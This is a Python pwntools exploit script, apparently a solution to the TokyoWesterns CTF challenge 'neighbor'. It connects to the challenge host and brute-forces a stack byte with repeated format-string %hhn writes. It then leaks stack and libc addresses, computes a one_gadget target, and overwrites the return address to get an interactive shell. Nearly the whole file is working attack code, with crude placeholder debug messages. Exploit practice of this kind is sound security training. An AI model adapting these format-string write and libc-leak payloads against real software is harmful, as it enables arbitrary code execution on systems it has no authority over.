from pwn import *

#r = process("./neighbor", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("neighbor.chal.ctf.westerns.tokyo", 37565)

print r.recvuntil("mayor.\n")

for i in range(1):
        r.sendline("%08c%9$hhn")
        sleep(1)
        r.sendline("%144c%11$hhn")
        sleep(1)
        r.sendline("%1c%6$hhnAAAA")

        try:
                print r.recvuntil("AAAA")
                break
        except:
                print "sex"
        r.sendline("%40c%9$hhn")
        sleep(1)
        r.sendline("%144c%11$hhn")
        sleep(1)
        r.sendline("%1c%6$hhnAAAA")

        try:
                print r.recvuntil("AAAA")
                break
        except:
                print "sex"
        r.sendline("%72c%9$hhn")
        sleep(1)
        r.sendline("%144c%11$hhn")
        sleep(1)
        r.sendline("%1c%6$hhnAAAA")

        try:
                print r.recvuntil("AAAA")
                break
        except:
                print "sex"
        r.sendline("%104c%9$hhn")
        sleep(1)
        r.sendline("%144c%11$hhn")
        sleep(1)
        r.sendline("%1c%6$hhnAAAA")

        try:
                print r.recvuntil("AAAA")
                break
        except:
                print "sex"
	r.sendline("%136c%9$hhn")
	sleep(1)
	r.sendline("%144c%11$hhn")
	sleep(1)
	r.sendline("%1c%6$hhnAAAA")

	try:
		print r.recvuntil("AAAA")
		break
	except:
		print "sex"
        r.sendline("%168c%9$hhn")
        sleep(1)
        r.sendline("%144c%11$hhn")
        sleep(1)
        r.sendline("%1c%6$hhnAAAA")

        try:
                print r.recvuntil("AAAA")
                break
        except:
                print "sex"
        r.sendline("%200c%9$hhn")
        sleep(1)
        r.sendline("%144c%11$hhn")
        sleep(1)
        r.sendline("%1c%6$hhnAAAA")

        try:
                print r.recvuntil("AAAA")
                break
        except:
                print "sex"
		r.close()
                exit()

r.sendline("%7$p.%8$p.")
sleep(1)
print r.recvuntil("0x")
stack = int(r.recvuntil(".")[:-1], 16)
ret = stack - 0x38
print r.recvuntil("0x")
libc = int(r.recvuntil(".")[:-1], 16)
libc_base = libc-0x3c2520
one_gadget = libc_base + 0xf24cb

print "stack: " + hex(stack)
print "libc: " + hex(libc)
print "ret: " + hex(ret)

one = (stack+0x30) & 0xffff
sex1 = (stack-0x10) & 0xffff
sex2 = (ret & 0xff)

payload = "%"+str(one)+"c%7$hn"
r.sendline(payload)
sleep(1)

payload = "%11$n"
r.sendline(payload)
sleep(1)

payload = "%"+str(one+4)+"c%7$hn"
r.sendline(payload)
sleep(1)

payload = "%11$n"
r.sendline(payload)
sleep(1)

payload = "%"+str(sex1)+"c%7$hn"
r.sendline(payload)
sleep(1)

payload = "%"+str((ret)&0xffff)+"c%11$hn"
payload += "%3c%7$hn"
r.sendline(payload)
sleep(1)

one_up = one_gadget>>24
one_down = one_gadget&0xffffff

payload = "%"+str(one_down)+"c%9$n"
payload += "%"+str(one_up-one_down)+"c%11$n"
r.sendline(payload)

'''
r.sendline("%120c%9$hhn")
sleep(1)
r.sendline("%144c%11$hhn")
sleep(1)
r.sendline("%1c%6$hhnAAAA")
sleep(1)

try:
	print r.recvuntil("AAAA")
	r.interactive()
except:
	print "sex"	
r.sendline("%136c%9$hhn")
sleep(1)
r.sendline("%144c%11$hhn")
sleep(1)
r.sendline("%1c%6$hhnAAAA")
sleep(1)

try:
	print r.recvuntil("AAAA")
        r.interactive()
except:
	print "sex"
r.sendline("%152c%9$hhn")
sleep(1)
r.sendline("%144c%11$hhn")
sleep(1)
r.sendline("%1c%6$hhnAAAA")
'''
r.interactive()
